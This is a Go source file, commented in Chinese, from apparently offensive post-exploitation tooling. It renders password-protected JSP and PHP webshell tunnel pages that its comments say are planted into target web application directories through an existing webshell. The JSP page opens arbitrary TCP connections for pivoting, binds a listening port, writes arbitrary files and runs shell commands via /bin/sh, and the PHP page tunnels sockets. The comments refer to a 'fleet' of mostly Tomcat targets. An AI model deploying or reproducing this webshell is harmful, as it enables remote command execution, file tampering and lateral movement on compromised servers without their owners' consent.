package tunnel

import (
	"errors"
	"strings"
)

// 隧道页协议：POST form p(pwHash)/a(action)/s(session)/d(base64 数据)；
// 响应恒为 TUNR<base64(payload)>TUNZ，payload 形如 OK[:...] / ERR[:原因]。
// 页面由平台生成（RenderPage，注入密码哈希）并经 webshell_file_write 部署到目标
// web 应用目录；平台侧 pageCall 直连该页（不经过 shell 协议层），标记容错空白噪声。

// RenderPage 生成目标侧隧道页。kind: jsp / php。
func RenderPage(kind, pwHash string) (string, error) {
	kind = strings.ToLower(strings.TrimSpace(kind))
	var tpl string
	switch kind {
	case "jsp":
		tpl = tunnelJSP
	case "php":
		tpl = tunnelPHP
	default:
		return "", errors.New("lang 仅支持 jsp/php")
	}
	return strings.ReplaceAll(tpl, "__PWHASH__", pwHash), nil
}

// PageLangFor 按连接类型推荐隧道页语言：jsp→jsp，php→php，其余回退 jsp（舰队以 Tomcat 为主）。
func PageLangFor(connType string) string {
	switch strings.ToLower(strings.TrimSpace(connType)) {
	case "php":
		return "php"
	default:
		return "jsp"
	}
}

// SuggestPagePath 推荐落点：与现有 shell 同目录同扩展名（同目录即同 webapp 可达路径）。
func SuggestPagePath(connURL, lang string) string {
	u := connURL
	if i := strings.Index(u, "://"); i >= 0 {
		if j := strings.Index(u[i+3:], "/"); j >= 0 {
			u = u[i+3+j:] // 保留 path 部分
		} else {
			u = "/"
		}
	}
	dir := u[:strings.LastIndex(u, "/")+1]
	if dir == "" {
		dir = "/"
	}
	return dir + "ztun." + lang
}

const tunnelJSP = `<%@ page import="java.util.*,java.io.*,java.net.*,java.util.concurrent.ConcurrentHashMap,java.util.concurrent.atomic.AtomicBoolean" %><%!
private static final ConcurrentHashMap<String,Socket> TUN_S = new ConcurrentHashMap<String,Socket>();
private static final AtomicBoolean TUN_SERVE = new AtomicBoolean();
%><%
request.setCharacterEncoding("UTF-8");
String p=request.getParameter("p"),a=request.getParameter("a"),s=request.getParameter("s"),d=request.getParameter("d");
String r;
if(!"__PWHASH__".equals(p)) r="ERR:auth";
else if("ping".equals(a)) r="OK:PONG";
else if("dg".equals(a)) r="OK:n="+TUN_S.size()+",serve="+TUN_SERVE;
else if("serve".equals(a)){
  try{
    String hp=new String(Base64.getDecoder().decode(d),"UTF-8");
    final int fp=Integer.parseInt(hp.substring(hp.lastIndexOf(58)+1));
    if(!TUN_SERVE.compareAndSet(false,true)) r="OK:already";
    else{
      Thread th=new Thread(new Runnable(){ public void run(){
        try{
          ServerSocket ss=new ServerSocket();
          ss.bind(new InetSocketAddress(fp),64);
          while(true){
            try{
              Socket c=ss.accept();
              c.setTcpNoDelay(true); c.setSoTimeout(15000);
              String id="P"+Long.toHexString(System.nanoTime()&0xffffffL)+Integer.toHexString(new java.util.Random().nextInt(0xffff));
              TUN_S.put(id,c);
            }catch(Throwable tg){}
          }
        }catch(Throwable te){}
      }});
      th.setDaemon(true); th.start();
      r="OK:listening";
    }
  }catch(Exception e){ r="ERR:"+e.getClass().getSimpleName(); }
}else if("list".equals(a)){
  StringBuilder sb=new StringBuilder();
  for(String k:TUN_S.keySet()){ if(sb.length()>0) sb.append(','); sb.append(k); }
  r="OK:"+sb.toString();
}else if("open".equals(a)){
  try{
    String hp=new String(Base64.getDecoder().decode(d),"UTF-8");
    int i=hp.lastIndexOf(58);
    Socket so=new Socket();
    so.connect(new InetSocketAddress(hp.substring(0,i), Integer.parseInt(hp.substring(i+1))), 6000);
    so.setTcpNoDelay(true); so.setSoTimeout(15000);
    String id=Long.toHexString(System.nanoTime()&0xffffffL)+Integer.toHexString(new java.util.Random().nextInt(0xffff));
    TUN_S.put(id,so); r="OK:"+id;
  }catch(Exception e){ r="ERR:"+e.getClass().getSimpleName(); }
}else if("x".equals(a)){
  Socket so=TUN_S.get(s);
  if(so==null) r="ERR:closed";
  else{
    try{
      if(d!=null&&d.length()>0){
        byte[] ob=new byte[d.length()/2];
        for(int i=0;i<ob.length;i++) ob[i]=(byte)Integer.parseInt(d.substring(i*2,i*2+2),16);
        OutputStream os=so.getOutputStream(); os.write(ob); os.flush();
      }
      ByteArrayOutputStream buf=new ByteArrayOutputStream();
      InputStream is=so.getInputStream();
      so.setSoTimeout(450);
      byte[] bb=new byte[8192];
      try{
        for(;;){
          int n;
          try{ n=is.read(bb); }catch(SocketTimeoutException te){ break; }
          if(n<0) break;
          buf.write(bb,0,n);
          if(is.available()<=0||buf.size()>=262144) break;
        }
      }catch(IOException ie){}
      StringBuilder hx=new StringBuilder(buf.size()*2);
      for(byte b2:buf.toByteArray()) hx.append(String.format("%02x",b2));
      r="OK:"+hx;
    }catch(Exception e){ TUN_S.remove(s); try{so.close();}catch(Exception e2){} r="ERR:"+e.getClass().getSimpleName(); }
  }
}else if("bw".equals(a)){
  try{
    String path=new String(Base64.getDecoder().decode(s),"UTF-8");
    boolean ap=!"0".equals(request.getParameter("m"));
    java.io.FileOutputStream fo=new java.io.FileOutputStream(path, ap);
    byte[] hb=new byte[d.length()/2];
    for(int i=0;i<hb.length;i++) hb[i]=(byte)Integer.parseInt(d.substring(i*2,i*2+2),16);
    fo.write(hb); fo.close();
    r="OK";
  }catch(Exception e){ r="ERR:"+e.getClass().getSimpleName(); }
}else if("bx".equals(a)){
  try{
    String cmd=new String(Base64.getDecoder().decode(d),"UTF-8");
    Process pr=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    ByteArrayOutputStream buf=new ByteArrayOutputStream();
    java.io.InputStream is=pr.getInputStream();
    byte[] bb=new byte[8192]; int n;
    while((n=is.read(bb))>0) buf.write(bb,0,n);
    is.close(); pr.waitFor();
    r="OK:"+Base64.getEncoder().encodeToString(buf.toByteArray());
  }catch(Exception e){ r="ERR:"+e.getClass().getSimpleName(); }
}else if("close".equals(a)){
  Socket so=TUN_S.remove(s);
  if(so!=null) try{so.close();}catch(Exception e){}
  r="OK";
}else r="ERR:act";
response.setContentType("text/plain");
out.print("TUNR"+Base64.getEncoder().encodeToString(r.getBytes("UTF-8"))+"TUNZ");
%>`

// tunnelPHP 尽力而为：套接字存活依赖 PHP 进程复用（mod_php 单进程 / fpm pm=1）；
// 多 worker 场景会话会丢（ERR:closed），此时用 JSP 目标替代。
const tunnelPHP = `<?php
$__P='__PWHASH__';
$p=@$_POST['p'];$a=@$_POST['a'];$s=@$_POST['s'];$d=(string)@$_POST['d'];
function TUN_O($x){echo 'TUNR'.base64_encode($x).'TUNZ';exit;}
if(!isset($GLOBALS['TUN_S']))$GLOBALS['TUN_S']=array();
if($p!==$__P)TUN_O('ERR:auth');
if($a==='ping')TUN_O('OK:PONG');
if($a==='open'){
  $hp=base64_decode($d);$i=strrpos($hp,':');$h=substr($hp,0,$i);$pt=(int)substr($hp,$i+1);
  $so=@stream_socket_client('tcp://'.$h.':'.$pt,$en,$es,6);
  if(!$so)TUN_O('ERR:conn');
  stream_set_timeout($so,1);
  $id=substr(md5(uniqid('',true)),0,12);
  $GLOBALS['TUN_S'][$id]=$so;
  TUN_O('OK:'.$id);
}
if($a==='x'){
  $so=@$GLOBALS['TUN_S'][$s];
  if(!$so)TUN_O('ERR:closed');
  if($d!==''){@fwrite($so,base64_decode($d));}
  $buf='';$t=microtime(true);
  while(microtime(true)-$t<0.5){
    $c=@fread($so,8192);
    if($c===false)break;
    if(strlen($c)>0){$buf.=$c;if(strlen($buf)>=262144)break;}
    else{usleep(25000);}
  }
  TUN_O('OK:'.base64_encode($buf));
}
if($a==='close'){
  if(isset($GLOBALS['TUN_S'][$s])){@fclose($GLOBALS['TUN_S'][$s]);unset($GLOBALS['TUN_S'][$s]);}
  TUN_O('OK');
}
TUN_O('ERR:act');
`
